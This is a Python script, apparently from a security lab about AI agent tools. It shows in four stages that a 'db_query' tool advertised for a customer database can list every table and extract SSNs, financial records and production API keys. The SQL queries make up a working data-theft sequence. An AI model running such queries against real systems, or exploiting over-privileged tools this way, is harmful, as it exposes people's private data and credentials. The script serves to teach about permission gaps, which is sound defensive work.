"""03_over_privileged.py — the db_query tool advertises "customer database"
but the role behind it owns every table in the schema, including PII,
financial records, and API keys.

The "attack" here is not bypassing anything — it's noticing that the
gap between *advertised* permissions and *actual* permissions IS the
attack surface. Two natural-language probes from an authenticated user
extract production secrets.

Usage:
    .venv/bin/python attacks/03_over_privileged.py
"""

import sys

from _helpers import banner, call


def main() -> int:
    banner("Stage A · enumerate every table the tool can reach")
    print(call("db_query", sql="SELECT name FROM sqlite_master WHERE type='table' ORDER BY name"))

    banner("Stage B · pull customer PII (SSN, DOB, addresses)")
    print(call("db_query",
               sql="SELECT c.name, c.email, p.ssn, p.date_of_birth FROM customers c "
                   "JOIN customer_pii p ON c.id = p.customer_id"))

    banner("Stage C · dump production API keys")
    keys = call("db_query", sql="SELECT service, key_name, key_value FROM api_keys")
    print(keys)

    banner("Stage D · financial-records cross-reference")
    print(call("db_query",
               sql="SELECT c.name, f.last_4_card, f.monthly_spend FROM customers c "
                   "JOIN financial_records f ON c.id = f.customer_id"))

    print()
    if "Stripe" in keys or "AKIA" in keys or "SG." in keys:
        print("✓ ATTACK SUCCEEDED — the tool advertised as 'execute a query "
              "against the customer database' reached customer_pii, "
              "financial_records, and api_keys. Lesson: the docstring is "
              "not a permission boundary; the DB role is.")
        return 0
    return 1


if __name__ == "__main__":
    sys.exit(main())
